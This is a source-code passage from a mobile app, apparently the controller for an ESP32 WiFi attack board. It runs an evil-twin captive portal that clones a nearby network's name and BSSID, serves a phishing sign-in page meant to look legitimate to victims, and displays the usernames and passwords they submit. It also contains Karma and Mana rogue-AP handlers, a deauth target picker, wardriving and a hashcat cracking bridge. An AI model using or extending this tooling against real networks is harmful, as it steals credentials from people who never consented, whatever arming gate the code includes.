    dongleSession.scriptShow().then((s) => dlog('script now:\n' + (s.body || '(empty)')));
  });
  $('#mjScriptDelay').addEventListener('click', async () => {
    const ms = parseInt($('#mjScriptText').value, 10);
    if (!Number.isFinite(ms)) return;
    const r = await dongleSession.scriptDelay(ms);
    dlog(`> script delay ${ms}\n${r.body || '(appended)'}`);
  });
  $('#mjScriptShow').addEventListener('click', async () => {
    const r = await dongleSession.scriptShow();
    dlog('script:\n' + (r.body || '(empty)'));
  });
  $('#mjScriptStore').addEventListener('click', async () => {
    const name = $('#mjScriptName').value.trim();
    if (!name) { dlog('Give the script a name first — the dongle keeps them by name.'); return; }
    const r = await dongleSession.scriptStore(name);
    // The shell refuses to overwrite a stored name; its own words are the answer.
    dlog(`> script store "${name}"\n${(r.body || '').trim() || '(stored)'}`);
    if (!r.timedOut) dlog('scripts on the dongle:\n' + (((await dongleSession.scriptList()).body) || '(none)').trim());
  });


  $('#importFile').addEventListener('change', (e) => {
    const f = e.target.files?.[0];
    // Clear the input so picking the same file twice in a row still fires.
    e.target.value = '';
    onImportPick(f);
  });

  // A share can arrive before this runs (cold start from the share sheet) or while
  // the app is already open (Android reuses the task, so onNewIntent fires and the
  // activity resumes). Both land here: once now, and once on every return to front.
  checkSharedCapture();
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) checkSharedCapture();
  });

  // Wipe a stale bridge token so a compiled-in default wins — but ONLY when
  // there is a default to win with. The default is empty now (it lives in the
  // gitignored bridge-defaults.js), and wiping against an empty default would
  // delete a token the user set in Settings on every single boot.
  const savedToken = localStorage.getItem('bridgeToken');
  if (BRIDGE_DEFAULT_TOKEN && savedToken && savedToken !== BRIDGE_DEFAULT_TOKEN) {
    localStorage.removeItem('bridgeToken');
  }

  // Target pick buttons use event delegation — they're rendered dynamically.
  // The deauth pill is the second route into the same action: it is the card's most
  // prominent affordance and it names the action, so it must not be inert. Both
  // carry data-idx, so one handler reads both.
  document.addEventListener('click', (e) => {
    const btn = e.target.closest('.pick-target, .taction[data-idx]');
    if (btn) onPickTarget({ currentTarget: btn });
  });

  // ── initialise Wardrive ─────────────────────────────────────────────────────
  if (window.Wardrive) {
    window.Wardrive.init({
      request,
      log,
      icon: Icon,
      gps: window.GPS,
      hashStore: window.HashStore,
    });
  }

  refreshPanels();
  setConnected(false);
  // After setConnected, not before: the Capture view rule reads the console card's
  // state as "is the board connected", so it has to run once that is settled.
  applyCaptureView();
  log('ev', 'ready');

  const hasPlugin = !!window.Capacitor?.Plugins?.UsbSerial;
  log('ev', `UsbSerial plugin: ${hasPlugin ? 'available' : 'NOT AVAILABLE'}`);
  if (!hasPlugin) {
    log('err', 'This only works in the installed app — a browser has no USB-OTG access.');
  }

  // ── Bridge keepalive ─────────────────────────────────────────────────────────────
  // Ping the bridge every 30 s so the status auto-recovers after the phone
  // wakes from doze or the WiFi reconnects. Silent on failure — and silent
  // ENTIRELY while wardriving: nothing in a wardrive session needs the LAN, so
  // pinging a host that isn't involved just fills the log with failures.
  setInterval(async () => {
    if (wardriveActive()) return;
    // Only ping if we're past the confirm stage (user has set a URL) and we
    // either have a stale status or the crack job would benefit from recovery.
    const cfg = bridgeConfig();
    if (!cfg.url) return;
    // Skip if we already have a healthy status and nothing is running
    if (bridgeStatus?.ok && !crackRunning && !analyzerRunning) return;
    try {
      const h = await bridgeClient().health();
      if (!bridgeStatus?.ok || bridgeStatus.hashcat !== h.hashcat) {
        bridgeStatus = h;
        bridgeError = null;
        refreshPanels();
        log('ev', `bridge keepalive: ${h.hashcat} ready`);
      }
    } catch {
      // silently ignore — next tick will retry
    }
  }, 30000);

  // ── the page bar ────────────────────────────────────────────────────────────
  const tabbar = $('#tabbar');
  if (tabbar) {
    tabbar.innerHTML = PAGE_TABS.map((t) => `
      <button class="tab" data-page="${t.id}" role="tab" aria-selected="false" aria-label="${t.label}">
        ${Icon(t.icon, { size: 19 })}<span>${t.label}</span>
      </button>`).join('');
  }
  // One delegated handler for every jump-to-page control: the tabs, the module rows
  // on Home, and any "go there" button a panel grows later.
  document.addEventListener('click', (e) => {
    const jump = e.target.closest('[data-page]');
    if (jump && !jump.disabled) {
      e.preventDefault();
      setPage(jump.dataset.page);
      // A row that names a view inside that page opens the view too — landing on
      // Capture's Wardrive row without switching to the Wardrive view would show
      // the packets card and hide the thing the row pointed at.
      if (jump.dataset.captureView) setCaptureView(jump.dataset.captureView);
      // A tile may name the thing on that page it is talking about, so tapping
      // "Dongle — not connected" lands on the dongle, not at the top of Attacks.
      const land = jump.dataset.scroll;
      if (land) setTimeout(() => document.getElementById(land)?.scrollIntoView({ block: 'start', behavior: 'smooth' }), 60);
      return;
    }
    // View switchers. They only change what is on screen — see the views section:
    // no view opens a capture, a sweep or a wardrive.
    const cap = e.target.closest('[data-capture-view]');
    if (cap) { setCaptureView(cap.dataset.captureView); return; }
    const an = e.target.closest('[data-analysis-view]');
    if (an) setAnalysisView(an.dataset.analysisView);
  });
  // The gear is a toggle, not a one-way door: tapping it off Settings returns you to
  // the section you were reading rather than dumping you back on Home. Logs, which
  // is not on the bar either, behaves the same way.
  $('#gearBtn')?.addEventListener('click', () => {
    setPage($('#page-settings')?.classList.contains('active') ? lastSection : 'settings');
  });
  $('#logsBtn')?.addEventListener('click', () => {
    setPage($('#page-logs')?.classList.contains('active') ? lastSection : 'logs');
  });

  let start = 'home';
  try { start = localStorage.getItem(PAGE_KEY) || 'home'; } catch (e) {}
  setPage(start);
  refreshDevices();
}

document.addEventListener('DOMContentLoaded', boot);


// ── the portal: the twin a client actually lands on ──────────────────────────
//
// This is the app half of firmware/src/portal.h. Modules are pure and main.cpp
// replies, so nothing here builds anything the radio sends — it seeds a twin
// from a scan, asks a human to choose one, arms it with the token, pushes the
// page in chunks, and shows what somebody typed.
//
// Three things here are deliberate, and each is easy to "fix" into something
// wrong:
//   * The twin is NEVER auto-picked. rankTwinCandidates orders candidates; the
//     operator chooses. Auto-picking the strongest clones whichever neighbour
//     happens to be loudest — an attack on somebody who was not chosen.
//   * The arm token is exact. 'true', '1', 'yes' and 'ARM' are all refused. It
//     replaced SCOPE_ALLOWLIST; it is not ceremony and it is not a boolean.
//   * The page is pushed in chunks on CHARACTER boundaries, not byte counts. A
//     512-byte split that lands mid-UTF-8 shows mojibake on the victim's screen,
//     which is the one screen that has to look legitimate.
//
// Status is painted in place rather than by re-rendering the panel: a full
// re-render on the 2 s tick would wipe the page textarea out from under whoever
// is typing in it.

let portalRunning = false;
let portalScanning = false;
let portalScanAps = null;      // last /scan aps[] — the candidate pool
let portalTwin = null;         // the operator's pick: { ssid, bssid, channel }
let portalArmed = null;        // portalArm() verdict for the current pick
let portalStatus = null;       // last portal_status — the RADIO's numbers
let portalPushResult = null;   // page push outcome
let portalSubs = [];           // submissions; memory only, never written down
let portalTicker = null;

/**
 * The page the portal serves. Picks a template from the library and bakes the
 * twin's claimed SSID into it. The operator chooses the template; the default
 * is 'generic' and it is always overridable in the textarea.
 */
function portalPageHtml(ssid, templateId) {
  const tmpl = PORTAL_TEMPLATES.find((t) => t.id === templateId) || PORTAL_TEMPLATES[0];
  return tmpl.fn(ssid || '');
}

/** Saved template preference, defaulting to 'generic'. */
function portalTemplateId() {
  return localStorage.getItem('portalTemplate') || 'generic';
}

/** The live numbers, from the radio's own counters. */
function portalLiveHtml() {
  if (!portalStatus) {
    return `<div class="crackmeta">Not started. Scan, pick the twin, arm it, then start.</div>`;
  }
  if (portalStatus.error) {
    return `<div class="crackstate">${Icon('alert', { size: 15 })}${escapeHtml(portalStatus.error)}</div>`;
  }
  const s = portalStatus;
  const up = s.ap_up ? 'AP up' : (s.running ? 'AP coming up' : 'AP down');
  return `
    <div class="crackmeta">${escapeHtml(up)} · SSID <code>${escapeHtml(String(s.ssid ?? portalTwin?.ssid ?? '—'))}</code>
      · channel ${escapeHtml(String(s.channel ?? portalTwin?.channel ?? '—'))}
      · cloned BSSID: ${s.cloned_bssid ? 'yes' : 'no'}</div>
    <div class="crackmeta">stations now ${escapeHtml(String(s.stations ?? 0))} · ever ${escapeHtml(String(s.stations_ever ?? 0))}
      · DNS answered ${escapeHtml(String(s.dns_answered ?? 0))} / refused ${escapeHtml(String(s.dns_refused ?? 0))}
      / unparseable ${escapeHtml(String(s.dns_bad ?? 0))}
      · HTTP ${escapeHtml(String(s.http_gets ?? 0))} GET, ${escapeHtml(String(s.http_posts ?? 0))} POST</div>
    <div class="crackmeta">submissions ${escapeHtml(String(s.subs_taken ?? 0))} taken, ${escapeHtml(String(s.subs_blank ?? 0))} blank
      · page ${s.page_loaded ? escapeHtml(String(s.page_bytes)) + ' bytes' : 'none'}</div>
    ${s.subs_queued ? `<div class="crackmeta">${escapeHtml(String(s.subs_queued))} submission(s) still held on the radio, waiting for this link.</div>` : ''}
    <div class="crackmeta">The radio reports that the AP is up and beaconing. It cannot observe whether
      any given device finds it, and does not claim to.</div>`;
}

/** What came back. Rendered as text, never as markup, and never written to disk. */
function portalSubsHtml() {
  if (!portalSubs.length) {
    return `<div class="crackmeta">Nothing submitted yet. Whatever arrives is held in this app's memory
      only — the radio does not write it to flash, and Clear is the only thing that drops it.</div>`;
  }
  const rows = portalSubs.map((s, i) => `
    <div class="crackmeta">${i + 1}. <code>${escapeHtml(s.user || '(no username)')}</code>
      · <code>${escapeHtml(s.pass || (s.blank ? '(blank)' : '(none)'))}</code>
      · from ${escapeHtml(s.ip || '?')}${s.ms ? ' · ' + (s.ms / 1000).toFixed(1) + ' s' : ''}</div>`).join('');
  return `
    <div class="pnllist">${rows}</div>
    <div class="row" style="margin-top:8px">
      <button id="portalSubsClear" class="ghost">${Icon('unlink', { size: 15 })}Clear</button>
    </div>`;
}

function paintPortal() {
  // innerHTML, like the rest of this app's rendering. Safe here for the same
  // reason: every dynamic value in portalLiveHtml/portalSubsHtml goes through
  // escapeHtml first — the numbers are numeric, and the strings are an SSID and
  // whatever somebody typed into the twin's page, which is exactly the content
  // that must never be able to become markup.
  const live = $('#portalLive');
  if (live) live.innerHTML = portalLiveHtml();
  const subs = $('#portalSubsBox');
  if (subs) {
    subs.innerHTML = portalSubsHtml();
    // The Clear button lives inside the block we just replaced, so its listener
    // has to be re-attached here rather than once at panel render.
    $('#portalSubsClear')?.addEventListener('click', () => { portalSubs = []; paintPortal(); });
  }
}

// The board's own band report, as it last told us (`status.bands`: "2.4" or
// "2.4+5"). Deliberately left undefined when no device has answered yet, so the
// portal falls back to its 2.4 GHz-only default instead of assuming a dual-band
// radio that may not be there.
const deviceBands = () => state.deviceInfo?.bands;

function portalActionHtml(a) {
  if (!a.ready) return '';

  const cands = portalScanAps ? rankTwinCandidates(portalScanAps, { bands: deviceBands() }) : [];
  const pick = portalTwin;
  const armed = portalArmed;
  const armSaved = localStorage.getItem('portalArm') || '';

  const candOptions = cands.length
    ? cands.map((c) => `
        <option value="${escapeHtml(c.bssid)}" ${pick && pick.bssid === c.bssid ? 'selected' : ''}>
          ${escapeHtml(c.ssid || '(hidden)')} · ${escapeHtml(c.bssid)} · ${c.rssi == null ? 'rssi ?' : escapeHtml(String(c.rssi)) + ' dBm'} · ${escapeHtml(String(c.auth))}${c.cloneable ? '' : ' — ' + escapeHtml(c.why)}
        </option>`).join('')
    : `<option value="">— no scan yet —</option>`;

  const twinLine = pick
    ? `<div class="crackmeta">Twin target: <code>${escapeHtml(pick.ssid)}</code> on channel
         ${escapeHtml(String(pick.channel))}${pick.bssid ? `, cloned BSSID <code>${escapeHtml(pick.bssid)}</code>` : ', own BSSID (not cloned)'}.</div>`
    : `<div class="crackmeta">No twin chosen. A scan seeds the candidates; you pick one.</div>`;

  const armedLine = armed && !armed.armed
    ? `<div class="crackstate">${Icon('alert', { size: 15 })}${escapeHtml(armed.problems[0])}</div>`
    : '';

  const pageVal = (() => {
    const saved = localStorage.getItem('portalPage');
    if (saved) return saved;
    return portalPageHtml(pick?.ssid, portalTemplateId());
  })();
  const push = portalPushResult;
  const tmplId = portalTemplateId();

  return `
  <div class="crackbox">
    <div class="crackstate">${Icon('scan', { size: 15 })}Seed the twin from the air</div>
    <div class="crackmeta">One radio, so the twin has to sit on the target's own channel — the S3 is
      2.4 GHz only, and a 5 GHz target cannot be twinned with this board.</div>
    <div class="row" style="margin-top:8px">
      <button id="portalScan" class="ghost" ${portalScanning ? 'disabled' : ''}>
        ${Icon('scan', { size: 15 })}${portalScanning ? 'Scanning…' : 'Scan now'}</button>
    </div>
    <label class="field" style="margin-top:8px">
      <span>Candidate${cands.length ? ` (${cands.length})` : ''} — ranked by signal, which is a proxy
        for "worth the effort", not proof anyone is home</span>
      <select id="portalPick" ${cands.length ? '' : 'disabled'}>${candOptions}</select>
    </label>
    ${twinLine}
    ${armedLine}

    <div class="crackstate" style="margin-top:12px">${Icon('link', { size: 15 })}Arm it</div>
    <div class="crackmeta">The gate that replaced the scope allowlist. It must be typed, and it is
      checked exactly — near-misses like <code>true</code> or <code>ARM</code> are refused. This is
      the point where you say out loud that a stranger's device can join this.</div>
    <label class="field" style="margin-top:6px">
      <span>Arming token — required value: <code>${escapeHtml(PORTAL_ARM_TOKEN)}</code></span>
      <input id="portalArmInput" type="text" autocapitalize="off" spellcheck="false"
             value="${escapeHtml(armSaved)}" placeholder="type it in full — there is no default">
    </label>

    <div class="row" style="margin-top:8px">
      ${portalRunning
        ? `<button id="portalStop" class="ghost">${Icon('unlink', { size: 18 })}Stop the twin</button>
           <button id="portalRefresh" class="ghost" style="margin-left:0">${Icon('refresh', { size: 15 })}</button>`
        : `<button id="portalGo" class="primary">${Icon('link', { size: 18 })}Start the twin</button>`}
    </div>

    <div id="portalLive" style="margin-top:8px">${portalLiveHtml()}</div>

    <div class="crackstate" style="margin-top:12px">${Icon('capture', { size: 15 })}The page it serves</div>
    <div class="crackmeta">Sent to the radio in chunks and kept in its RAM, not on its flash. Pick a
      template that matches what the target network expects — a generic sign-in on a coffee shop
      WiFi will not fool anyone. The ${pick ? `<code>${escapeHtml(pick.ssid)}</code>` : 'twin'}'s name is
      baked into the page.</div>
    <label class="field" style="margin-top:6px">
      <span>Template</span>
      <select id="portalTmpl">
        ${PORTAL_TEMPLATES.map((t) => `<option value="${escapeHtml(t.id)}"${tmplId === t.id ? ' selected' : ''}>${escapeHtml(t.label)} — ${escapeHtml(t.desc)}</option>`).join('')}
      </select>
    </label>
    <label class="field">
      <span>The page HTML (editable — template fills it, you can change it)</span>
      <textarea id="portalPage" rows="12" spellcheck="false" autocapitalize="off">${escapeHtml(pageVal)}</textarea>
    </label>
    <div class="row" style="margin-top:6px">
      <button id="portalPush" class="ghost" ${portalRunning ? '' : 'disabled'}>
        ${Icon('capture', { size: 15 })}Push page to the radio</button>
      <button id="portalPageDefault" class="ghost" style="margin-left:0">Reset to template</button>
    </div>
    ${push ? `<div class="crackmeta">${
      push.phase === 'done'
        ? `Stored: ${escapeHtml(String(push.stored))} bytes in ${escapeHtml(String(push.chunks))} chunk(s).`
        : push.phase === 'error'
          ? escapeHtml(push.error)
          : 'Pushing…'
    }</div>` : ''}

    <div class="crackstate" style="margin-top:12px">${Icon('key', { size: 15 })}What came back</div>
    <div id="portalSubsBox">${portalSubsHtml()}</div>
  </div>`;
}

async function onPortalScan() {
  portalScanning = true;
  refreshPanels();
  try {
    // The firmware replies to /scan asynchronously, from its loop — hence the
    // generous timeout rather than a tight one.
    const resp = await request('SCAN', {}, { timeoutMs: 25000 });
    if (!resp?.ok) throw new Error(resp?.error || 'the scan was refused');
    portalScanAps = Array.isArray(resp.aps) ? resp.aps : [];
    const cloneable = rankTwinCandidates(portalScanAps, { onlyCloneable: true, bands: deviceBands() }).length;
    log('ev', `portal: scan found ${portalScanAps.length} AP(s), ${cloneable} cloneable into a PSK twin`);
    // A fresh scan invalidates the old pick: the operator chose from what was in
    // the air at that moment, and carrying it over would silently re-target.
    portalTwin = null;
    portalArmed = null;
  } catch (e) {
    log('err', 'portal: ' + e.message);
  }
  portalScanning = false;
  refreshPanels();
}

function onPortalPickCandidate(e) {
  const bssid = e.target.value;
  if (!bssid || !portalScanAps) return;
  const ap = portalScanAps.find((x) => String(x.bssid).toLowerCase() === String(bssid).toLowerCase());
  if (!ap) { log('err', 'portal: that candidate is no longer in the scan'); return; }

  // selectTwinTarget refuses rather than substituting, so a refusal here is real
  // information — it is not going to quietly clone something else.
  const sel = selectTwinTarget(portalScanAps, { ssid: ap.ssid, bssid: ap.bssid, bands: deviceBands() });
  if (!sel.ok) {
    portalTwin = null; portalArmed = null;
    log('err', 'portal: ' + sel.reason);
  } else {
    portalTwin = { ssid: sel.twin.ssid, bssid: sel.twin.bssid, channel: sel.twin.channel };
    portalArmed = null;
    // Regenerate the page HTML with the new SSID — a router-login template
    // that still says "Starbucks WiFi" is worse than the old constant.
    localStorage.removeItem('portalPage');
    log('ev', `portal: twin target is "${sel.twin.ssid}" on channel ${sel.twin.channel}`);
  }
  refreshPanels();
}

async function onPortalStart() {
  if (!portalTwin) { log('err', 'portal: scan and pick a twin first'); return; }
  const token = $('#portalArmInput')?.value || '';

  const armed = portalArm({
    acknowledge: token,
    ssid: portalTwin.ssid,
    channel: portalTwin.channel,
    bssid: portalTwin.bssid,
  });
  portalArmed = armed;
  if (!armed.armed) {
    log('err', 'portal: ' + armed.problems[0]);
    refreshPanels();
    return;
  }

  localStorage.setItem('portalArm', token);
  portalRunning = true;
  portalStatus = { running: true, ap_up: false, ssid: armed.ssid, channel: armed.channel };
  refreshPanels();

  try {
    const resp = await request('PORTAL_START', {
      ssid: armed.ssid,
      bssid: armed.bssid || undefined,
      channel: armed.channel,
      captive_portal_uri: armed.captivePortalUri,
      acknowledge: token,
    }, { timeoutMs: 15000 });
    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused to start the portal');
    portalStatus = { ...resp, running: true };
    log('ev', `portal: twin up on "${armed.ssid}" channel ${armed.channel}`);
  } catch (e) {
    portalRunning = false;
    portalStatus = { error: e.message };
    log('err', 'portal: ' + e.message);
  }
  refreshPanels();
  if (portalRunning) pollPortalStatus();
}

async function onPortalStop() {
  portalRunning = false;
  if (portalTicker) { clearTimeout(portalTicker); portalTicker = null; }
  try {
    const resp = await request('PORTAL_STOP', {}, { timeoutMs: 8000 });
    if (!resp?.ok) throw new Error(resp?.error || 'the radio refused to stop');
    log('ev', `portal: stopped (${resp.wiped ? 'page wiped' : 'page kept'})`);
    portalStatus = null;
  } catch (e) {
    portalStatus = { error: e.message };
    log('err', 'portal: ' + e.message);
  }
  refreshPanels();
}

async function pollPortalStatus() {
  if (!portalRunning) return;
  try {
    const r = await request('PORTAL_STATUS', {}, { timeoutMs: 6000 });
    if (r?.ok) portalStatus = { ...r, running: true };
  } catch (e) {
    log('err', 'portal status: ' + e.message);
  }
  // Paint, do not re-render: a full re-render would wipe the page textarea.
  //
  // Unconditional — the third dead `state.stage === 'attack'` gate. This one is why
  // the twin's live counters (DNS queries, HTTP hits, stations, queued submissions)
  // sat still while the portal was armed and running: the poll fired every 2 s and
  // then threw its result away. paintPortal() guards its own lookups, so there is
  // nothing to protect it from.
  paintPortal();
  if (portalRunning) portalTicker = setTimeout(pollPortalStatus, 2000);
}

async function onPortalPushPage() {
  if (!portalRunning) { log('err', 'portal: start the twin before pushing a page'); return; }
  const html = $('#portalPage')?.value || '';
  if (!html.trim()) { log('err', 'portal: the page is empty — a blank page is not a sign-in page'); return; }
  localStorage.setItem('portalPage', html);

  const bytes = new TextEncoder().encode(html);
  portalPushResult = { phase: 'pushing' };
  refreshPanels();

  try {
    const b = await request('PORTAL_PAGE_BEGIN', {}, { timeoutMs: 8000 });
    if (!b?.ok) throw new Error(b?.error || 'the radio refused to open the page buffer');

    // Character boundaries, not byte counts — see the note at the top.
    const chunks = portalPageChunks(html, 512);
    let stored = 0;
    for (let i = 0; i < chunks.length; i++) {
      const hex = Array.from(chunks[i]).map((x) => x.toString(16).padStart(2, '0')).join('');
      const r = await request('PORTAL_PAGE_CHUNK', { hex }, { timeoutMs: 8000 });
      if (!r?.ok) throw new Error(r?.error || `the radio refused chunk ${i + 1} of ${chunks.length}`);
      stored = Number(r.total ?? stored);
    }

    const end = await request('PORTAL_PAGE_END', {}, { timeoutMs: 8000 });
    if (!end?.ok) throw new Error(end?.error || 'the radio refused to close the page');

    portalPushResult = { phase: 'done', chunks: chunks.length, stored: Number(end.bytes ?? stored) };
    log('ev', `portal: page pushed — ${chunks.length} chunk(s), ${end.bytes ?? stored} bytes on the radio (page was ${bytes.length} bytes)`);
  } catch (e) {
    portalPushResult = { phase: 'error', error: e.message };
    log('err', 'portal: ' + e.message);
  }
  refreshPanels();
}

// ── Karma handlers ──────────────────────────────────────────────────────────

/** Build the Karma template and start probe_reply on the board. The template
 *  uses a 32-byte sentinel SSID; the firmware memcpy-swaps the real SSID on
 *  each answer. kssid_offset is fixed at 38 for our template layout. */
async function onKarmaStart() {
  const chEl = $('#karmaCh');
  const listEl = $('#karmaList');
  const modeEl = $('#karmaModeSel');
  const channel = parseInt(chEl?.value || '6', 10);
  const ssids = (listEl?.value || '').split(/[\n]+/).map(s => s.trim()).filter(Boolean);
  const mode = modeEl?.value || 'allowlist';

  localStorage.setItem('karmaChannel', String(channel));
  localStorage.setItem('karmaAllowlist', listEl?.value || '');
  localStorage.setItem('karmaMode', mode);

  if (ssids.length === 0 && mode !== 'lab-any') {
    log('err', 'karma: need at least one SSID for allowlist mode');
    return;
  }

  const bssid = localStorage.getItem('attackBssid') || state.deviceInfo?.bssid || 'aa:bb:cc:dd:ee:ff';
  const sentinel = 'X'.repeat(32);

  let template;
  try {
    template = buildProbeResponse({
      ssid: sentinel,
      station: 'ff:ff:ff:ff:ff:ff',  // placeholder — firmware overwrites addr1
      bssid,
      channel,
      security: SECURITY.WPA2,
    });
  } catch (e) {
    log('err', 'karma: could not build the template — ' + e.message);
    return;
  }

  const templateHex = Array.from(template).map(b => b.toString(16).padStart(2, '0')).join('');
  const kssidOffset = 38;
  const kssidMaxlen = 32;

  karmaRunning = true;
  karmaResult = { phase: 'starting', channel, mode, matched: 0, sent: 0, failed: 0 };
  refreshPanels();

  try {
    const resp = await request('PROBE_REPLY_START', {
      channel,
      template_hex: templateHex,
      kssid_offset: kssidOffset,
      kssid_maxlen: kssidMaxlen,
      allowlist: ssids,
      mode,
    }, { timeoutMs: 10000 });

    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused');

    karmaResult = {
      ...karmaResult,
      started: resp.started,
      mode: resp.mode,
      allowlist_n: resp.allowlist_n,
    };
    log('ev', `karma: started on ch${channel}, mode=${mode}, ${ssids.length} name(s)`);
    refreshPanels();

    // Poll status until it stops (hard cap ~120s, or user stops)
    pollKarmaStatus();
  } catch (e) {
    karmaResult = { ...karmaResult, note: e.message };
    log('err', 'karma start: ' + e.message);
    karmaRunning = false;
    refreshPanels();
  }
}

async function pollKarmaStatus() {
  if (!karmaRunning) return;
  try {
    const st = await request('PROBE_REPLY_STATUS', {}, { timeoutMs: 5000 });
    karmaResult = {
      ...karmaResult,
      matched: st?.matched ?? 0,
      sent: st?.sent ?? 0,
      failed: st?.failed ?? 0,
      mode: st?.mode || karmaResult.mode,
      channel: st?.channel || karmaResult.channel,
      elapsed_ms: st?.elapsed_ms || 0,
    };
    if (!st?.running) {
      karmaRunning = false;
      log('ev', `karma: finished — ${st?.matched ?? 0} matched, ${st?.sent ?? 0} sent`);
    }
    refreshPanels();
    if (karmaRunning) setTimeout(pollKarmaStatus, 1500);
  } catch (e) {
    log('err', 'karma poll: ' + e.message);
    if (karmaRunning) setTimeout(pollKarmaStatus, 3000);
  }
}

async function onKarmaStop() {
  try {
    const st = await request('PROBE_REPLY_STOP', {}, { timeoutMs: 5000 });
    karmaRunning = false;
    karmaResult = {
      ...(karmaResult || {}),
      matched: st?.matched ?? 0,
      sent: st?.sent ?? 0,
      failed: st?.failed ?? 0,
      channel: st?.channel || karmaResult?.channel,
      elapsed_ms: st?.elapsed_ms || 0,
    };
    log('ev', `karma: stopped — ${st?.matched ?? 0} matched, ${st?.sent ?? 0} sent`);
    refreshPanels();
  } catch (e) {
    log('err', 'karma stop: ' + e.message);
    karmaRunning = false;
    karmaResult = { ...(karmaResult || {}), note: e.message };
    refreshPanels();
  }
}

// ── Mana handlers ───────────────────────────────────────────────────────────

/** Populate the Mana SSID textarea from the Analysis plan.
 *  Pulls rogue names first (devices asking for an AP that doesn't exist
 *  on the air — best targets), then AP SSIDs from the plan, dedup'd.
 *  Firmware caps at 64, so anything beyond that is dropped with a note. */
function onManaPopulate() {
  const listEl = $('#manaList');
  if (!listEl) return;
  const p = analysisPlan;
  if (!p) return;

  const seen = new Set();
  const list = [];

  // Rogue names first — these are the strongest play
  if (p.rogue) {
    for (const g of p.rogue) {
      if (g.ssid && !seen.has(g.ssid)) {
        seen.add(g.ssid);
        list.push(g.ssid);
      }
    }
  }

  // Then AP SSIDs from the targets
  if (p.targets) {
    for (const t of p.targets) {
      if (t.name && !seen.has(t.name)) {
        seen.add(t.name);
        list.push(t.name);
      }
    }
  }

  // Keep the user's existing entries if the textarea already has content
  const existing = listEl.value.split('\n').map(s => s.trim()).filter(Boolean);
  for (const s of existing) {
    if (s && !seen.has(s)) {
      seen.add(s);
      list.push(s);
    }
  }

  const capped = list.slice(0, 64);
  listEl.value = capped.join('\n');

  const count = document.getElementById('manaPopulateCount');
  if (count) {
    const dropped = list.length - capped.length;
    count.textContent = `${capped.length} SSIDs${dropped > 0 ? ` (${dropped} over cap dropped)` : ''}`;
  }

  log('ev', `mana: populated ${capped.length} SSIDs from Analysis${list.length > capped.length ? `, ${list.length - capped.length} over 64 cap dropped` : ''}`);
}

/** Build a beacon pool from the user's SSID list and send it to the firmware. */
async function onManaStart() {
  const chEl = $('#manaCh');
  const listEl = $('#manaList');
  const intvEl = $('#manaIntv');
  const channel = parseInt(chEl?.value || '6', 10);
  const ssids = (listEl?.value || '').split(/[\n]+/).map(s => s.trim()).filter(Boolean);
  const interval = Math.max(50, parseInt(intvEl?.value || '110', 10));

  localStorage.setItem('manaChannel', String(channel));
  localStorage.setItem('manaSSIDs', listEl?.value || '');
  localStorage.setItem('manaInterval', String(interval));

  if (ssids.length === 0) {
    log('err', 'mana: need at least one SSID');
    return;
  }

  const bssid = localStorage.getItem('attackBssid') || state.deviceInfo?.bssid || 'aa:bb:cc:dd:ee:ff';

  let frames;
  try {
    frames = buildBeaconPool({
      ssids, bssid, channel, security: SECURITY.WPA2,
    });
  } catch (e) {
    log('err', 'mana: could not build the pool — ' + e.message);
    return;
  }

  const beacons = frames.map(f => ({
    hex: Array.from(f).map(b => b.toString(16).padStart(2, '0')).join(''),
    interval_ms: interval,
  }));

  manaRunning = true;
  manaResult = { phase: 'starting', channel, pool_size: beacons.length, sent: 0, failed: 0 };
  refreshPanels();

  try {
    const resp = await request('BEACON_POOL_START', {
      channel,
      beacons,
    }, { timeoutMs: 10000 });

    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused');

    manaResult = {
      ...manaResult,
      started: resp.started,
      pool_size: resp.pool_size,
    };
    log('ev', `mana: started on ch${channel}, ${beacons.length} beacon(s), ${interval}ms interval`);
    refreshPanels();

    pollManaStatus();
  } catch (e) {
    manaResult = { ...manaResult, note: e.message };
    log('err', 'mana start: ' + e.message);
    manaRunning = false;
    refreshPanels();
  }
}

async function pollManaStatus() {
  if (!manaRunning) return;
  try {
    const st = await request('BEACON_POOL_STATUS', {}, { timeoutMs: 5000 });
    manaResult = {
      ...manaResult,
      sent: st?.sent ?? 0,
      failed: st?.failed ?? 0,
      pool_size: st?.pool_size || manaResult.pool_size,
      channel: st?.channel || manaResult.channel,
      elapsed_ms: st?.elapsed_ms || 0,
    };
    if (!st?.running) {
      manaRunning = false;
      log('ev', `mana: finished — ${st?.sent ?? 0} sent, ${st?.failed ?? 0} failed`);
    }
    refreshPanels();
    if (manaRunning) setTimeout(pollManaStatus, 1500);
  } catch (e) {
    log('err', 'mana poll: ' + e.message);
    if (manaRunning) setTimeout(pollManaStatus, 3000);
  }
}

async function onManaStop() {
  try {
    const st = await request('BEACON_POOL_STOP', {}, { timeoutMs: 5000 });
    manaRunning = false;
    manaResult = {
      ...(manaResult || {}),
      sent: st?.sent ?? 0,
      failed: st?.failed ?? 0,
      channel: st?.channel || manaResult?.channel,
      elapsed_ms: st?.elapsed_ms || 0,
    };
    log('ev', `mana: stopped — ${st?.sent ?? 0} sent`);
    refreshPanels();
  } catch (e) {
    log('err', 'mana stop: ' + e.message);
    manaRunning = false;
    manaResult = { ...(manaResult || {}), note: e.message };
    refreshPanels();
  }
}

// ── Channel analyzer handlers ───────────────────────────────────────────────

async function onAnalyzerScan() {
  if (analyzerRunning) return;
  analyzerRunning = true;
  analyzerResult = { currentChannel: 0 };
  refreshPanels();

  try {
    const resp = await request('CHANNEL_ANALYZE', {
      dwell_ms: 1000,
    }, { timeoutMs: 30000 });

    if (resp?.ok && resp.channels) {
      analyzerResult = { ...resp, currentChannel: 11 };
      log('ev', `channel analyzer: ${resp.channels.length} channels scanned, ${resp.dwell_ms}ms dwell`);
      const total = resp.channels.reduce((s, c) => s + c.packets, 0);
      log('ev', `channel analyzer: ${total} total packets seen`);
    } else {
      analyzerResult = { ...(resp || {}), error: resp?.error || 'no data' };
      log('err', 'channel analyzer: ' + (resp?.error || 'no response'));
    }
  } catch (e) {
    analyzerResult = { error: e.message };
    log('err', 'channel analyzer: ' + e.message);
  }
  analyzerRunning = false;
  refreshPanels();
}

async function onAnalyzerStop() {
  if (!analyzerRunning) return;
  try {
    const resp = await request('CHANNEL_ANALYZE_STOP', {}, { timeoutMs: 5000 });
    if (resp?.ok) {
      analyzerResult = { ...(resp || {}), aborted: true, currentChannel: 11 };
    }
  } catch (e) {
